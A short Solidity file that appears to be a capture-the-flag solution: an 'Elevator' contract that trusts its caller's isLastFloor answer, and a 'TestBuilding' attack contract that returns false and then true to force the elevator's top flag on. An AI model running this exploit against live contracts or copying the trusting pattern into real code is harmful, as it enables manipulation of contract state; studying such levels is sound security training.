// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract TestBuilding {
    bool public lastFloor;

    function isLastFloor(uint _floor) public returns (bool) {
        if(lastFloor == true) {
            return true;
        }
        else {
            lastFloor = true;
            return false;
        }
    }

    function attack(address _elevator) public {
        Elevator(_elevator).goTo(1);
    }
}